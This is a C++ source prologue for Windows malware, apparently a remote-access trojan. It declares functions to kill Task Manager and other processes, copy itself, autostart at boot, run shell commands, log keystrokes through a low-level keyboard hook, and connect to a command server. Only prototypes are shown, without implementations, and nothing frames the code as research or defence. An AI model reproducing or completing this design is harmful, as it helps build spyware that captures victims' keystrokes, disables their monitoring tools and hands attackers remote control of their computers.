#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <fstream>

#ifndef _TOOLSKIT_HPP_
#define _TOOLSKIT_HPP_
#include "toolskit.hpp"
#endif

#ifndef _CSOCKET_HPP_
#define _CSOCKET_HPP_
#include "csocket.hpp"
#endif

#ifndef _CMDER_HPP_
#define _CMDER_HPP_
#include "cmder.hpp"
#endif

#pragma comment(lib, "WS2_32.lib")

// Terminating Task manager
void terminateTaskMngr();
HANDLE killingProcess();

// Replicate itself
std::string cpSelf();

// Start by boot
bool autoStart(std::string whichToAutoStart);

std::string runShell(std::string cmd);

// Keylogger
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
DWORD WINAPI KeyLogger(LPVOID lpParameter);
HANDLE startKeyLogging();

// Client
ServerInfo getServer();
DWORD WINAPI Connector(LPVOID lpParameter);
HANDLE startNetworking();